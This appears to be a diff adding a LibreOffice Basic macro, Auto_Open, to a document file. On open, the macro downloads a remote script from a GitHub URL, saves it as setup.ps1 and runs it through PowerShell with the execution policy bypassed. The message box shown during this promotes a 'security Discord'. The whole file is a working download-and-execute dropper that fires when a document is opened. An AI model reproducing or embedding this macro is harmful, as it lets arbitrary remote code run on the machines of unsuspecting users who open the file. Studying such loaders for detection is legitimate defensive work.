@@ -1,0 +1,51 @@
+REM  *****  BASIC  *****
+Sub Auto_Open()
+    Dim scriptUrl As String
+    Dim savePath As String
+    Dim functionAccess As Object
+    Dim webContent As String
+    
+    ' Set the URL of your PowerShell script
+    scriptUrl = "https://github.com/run-spec/auto/raw/refs/heads/main/setup"
+    
+    ' Save directly to desktop
+    savePath = "C:\Users\juraj_iptfkru\Desktop\test\setup.ps1"
+    
+    On Error GoTo ErrorHandler
+    
+    ' Use LibreOffice's built-in WEBSERVICE function to download
+    Set functionAccess = createUnoService("com.sun.star.sheet.FunctionAccess")
+    webContent = functionAccess.callFunction("WEBSERVICE", Array(scriptUrl))
+    
+    ' Check if we got content
+    If Len(webContent) > 0 Then
+        ' Save the script content to file
+        Dim fileHandle As Integer
+        fileHandle = FreeFile
+        Open savePath For Output As #fileHandle
+        Print #fileHandle, webContent
+        Close #fileHandle
+        
+        ' Show success message
+        MsgBox "PowerShell script downloaded successfully!" & Chr(13) & _
+               "Location: " & savePath & Chr(13) & _
+               "Join our security Discord: discord.gg/cybersec", 64, "Download Complete"
+        
+        ' Run the PowerShell script
+        Shell "powershell.exe -ExecutionPolicy Bypass -File """ & savePath & """", 1
+        
+    Else
+        MsgBox "Failed to download script. No content received.", 16, "Download Error"
+    End If
+    
+Cleanup:
+    ' Clean up objects
+    On Error Resume Next
+    Set functionAccess = Nothing
+    On Error GoTo 0
+    Exit Sub
+    
+ErrorHandler:
+    MsgBox "An error occurred: " & Error(Err) & " (Code: " & Err & ")", 16, "Error"
+    GoTo Cleanup
+End Sub
